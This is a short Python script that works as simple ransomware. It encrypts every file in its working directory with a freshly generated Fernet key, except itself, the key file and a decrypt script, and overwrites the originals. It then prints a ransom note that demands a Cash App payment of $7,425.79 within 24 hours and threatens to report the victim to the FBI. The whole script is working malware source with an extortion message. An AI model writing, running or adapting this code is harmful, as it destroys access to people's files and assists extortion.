#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet
#finding some files
files = []

for file in os.listdir():
        if file == "main.py" or file == "thekey.key" or file == "decrypt.py":
                continue
        if os.path.isfile(file):
                files.append(file)


print(files)

key = Fernet.generate_key()


with open("thekey.key", "wb") as thekey:
        thekey.write(key)


for file in files:
        with open(file, "rb") as thefile:
                contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
                thefile.write(contents_encrypted)


print("All of your files have been encrypted. You will cashapp me ($SBussisoDube) the ammount you have written on the fraudulent check you sent me via email ($7,425.79 USD)")
print("if you fail to do so I will hand everything over to the FBI including your real identity and location.")
print("you have 24 hours to respond")
print("you will respond via the same email thread you sent the counterfit check")